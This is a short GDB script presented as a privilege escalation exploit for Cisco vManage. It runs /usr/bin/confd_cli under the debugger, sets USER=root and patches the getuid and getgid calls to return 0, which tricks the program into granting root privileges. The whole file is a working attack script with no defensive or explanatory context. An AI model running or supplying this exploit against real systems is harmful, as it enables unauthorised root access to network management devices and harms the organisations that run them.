# GDB script for Cisco vManage privilege escalation
# Use with: gdb -x root.gdb /usr/bin/confd_cli
# This patches getuid() and getgid() to return 0 (root)

# Set environment to root
set environment USER=root

# Define a command to finish current function, set return value to 0, and continue
define root
   finish
   set $rax=0
   continue
end

# Break on getuid syscall and force return value of 0
break getuid
commands
   root
end

# Break on getgid syscall and force return value of 0
break getgid
commands
   root
end

# Run the program
run
